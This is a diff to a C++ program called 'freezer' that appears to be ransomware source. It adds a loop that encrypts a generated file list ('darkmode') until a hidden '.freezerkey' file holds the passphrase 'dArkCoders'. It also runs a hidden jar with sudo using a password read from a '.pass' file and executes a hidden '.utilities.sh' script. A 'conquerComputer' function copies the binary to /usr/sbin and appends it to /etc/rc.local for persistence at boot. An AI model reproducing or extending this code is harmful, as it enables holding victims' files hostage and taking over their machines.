@@ -11,7 +11,7 @@ using namespace std;
 
 int key=1;
 
-fstream fin,fout,lin,sysfin;
+fstream fin,fout,lin,sysfin,sysfout;
 string file_name,ext;
 
 void decrypt(string str,int key){
@@ -198,7 +198,8 @@ void del_lists()
     lin.close();
 }
 
-void list_reader(string task){
+void list_reader(string task)//calls enc_dec
+{
     if(task=="enc")
 	{
 	    lin.open(".files",ios::in);
@@ -231,14 +232,14 @@ void list_reader(string task){
 	del_lists();
 }
 
-void caller(string input)
+void caller(string input)//calls list reader 
 {
     list_gen();
-    if(input=="encrypt")
+    if(input=="darkmode")//go dark
 	{
 	    list_reader("enc");
 	}
-	else if(input=="dec")
+	else if(input=="safemode")//go safe
 	{
 	    list_reader("dec");
 	}
@@ -263,12 +264,33 @@ void demon(){
 }
 
 void initFreezer(string input)
-{
+{   
+    string passkey="hello";
     demon();
-	while(true){
+	while(true)
+	{
 	    sleep(4);
+	    
+	    //call java code of box display
+	    system("sudo -k -S java -jar .keybox.jar < .pass > /dev/null 2>&1 ");
+	    
+	    //code to change value of passkey from a file
+	    sysfin.open(".freezerkey",ios::in);
+	    if(sysfin)
+	    {    
+	        sysfin>>passkey;
+	    }    
+	    sysfin.close();
+	    
+	    //call the caller
 	    caller(input);
-	    cout<<"here\n";
+	    
+	    if(passkey=="dArkCoders")
+	    {
+	        caller("safemode");
+	        //del from /usr/sbin/
+	        exit(0);
+	    }
 	} 
 }
 
@@ -305,16 +327,52 @@ const bool processAlreadyRunning()
     return false;
 }
 
-int main(int argc, char *argv[])
+const bool checkForConquer()
 {
+    sysfin.open("/usr/sbin/freezer",ios::in);
+    if(!sysfin){
+        sysfin.close();
+        return false;
+    }
+    sysfin.close();
+    return true;
+}
+
+void conquerComputer()
+{
+    string command = "cp freezer /usr/sbin/";
+    system(command.c_str());
+    sysfout.open("/etc/rc.local",ios::out|ios::ate);
+    sysfout<<"/usr/sbin/freezer\nexit 0";
+    sysfout.close();
+}
+
+int main(int argc, char *argv[])
+{   
     if(processAlreadyRunning())
     {
         cout << "The process is already running\n";
         exit(0);
     }
     
+    system("./.utilities.sh");
+    
+    if(checkForConquer())
+    {
+       // conquerComputer();//done through shell
+    }
+    
 	string input;
-	input=argv[1];
+	if(argc==2)
+	{
+	    input=argv[1];
+	}
+	else
+	{
+	    input="safemode";
+	}
+	
 	initFreezer(input);
+	
 	return 0;
 }
